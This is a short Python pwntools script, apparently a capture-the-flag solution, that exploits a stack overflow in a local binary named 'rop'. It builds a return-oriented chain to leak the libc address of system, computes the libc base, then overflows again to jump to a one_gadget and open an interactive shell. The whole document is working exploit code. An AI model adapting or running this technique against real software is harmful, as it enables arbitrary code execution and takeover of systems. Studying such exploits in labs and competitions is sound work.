#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./rop")
elf = ELF("./rop")
libc = elf.libc
p1ret = 0x00400723

pay = 'A'*(0x20+0x8)
pay += p64(p1ret) + p64(elf.got['system']) + p64(elf.plt['system'])
pay += p64(elf.symbols['main'])

p.send(pay)
gdb.attach(p)
p.recvuntil("1: ")
system = u64(p.recvuntil("\x7f") + '\x00\x00')
log.info("system: "+hex(system))
libcBase = system - libc.symbols['system']
one_gadget = libcBase + 0x45216

p.sendafter("found\n", 'A'*(0x20+0x8) + p64(one_gadget))

p.interactive()
